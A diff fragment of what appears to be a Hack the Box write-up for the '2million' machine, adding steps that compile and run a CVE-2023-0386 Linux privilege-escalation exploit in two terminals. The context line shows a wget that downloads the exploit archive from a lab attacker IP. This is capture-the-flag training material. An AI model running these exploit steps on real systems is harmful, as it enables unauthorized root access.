@@ -572,3 +572,17 @@ wget http://10.10.14.23:8000/CVE-2023-0386-master.zip
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/71694b0c-b7fd-4628-8ef3-ef3b85322fa2)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5bfbed87-251a-451a-ac69-bec64abf3a46)
 
+```shell
+admin@2million:~/CVE-2023-0386-master$ make all
+```
+Terminal 1
+```shell
+admin@2million:~/CVE-2023-0386-master$ ./fuse ./ovlcap/lower ./gc
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/337fc4f0-fa79-4c86-929c-ba5f94deb43e)
+
+Terminal 2
+```shell
+admin@2million:~/CVE-2023-0386-master$ ./exp
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9e437e77-28bd-4c46-90b6-e74cea1640f4)
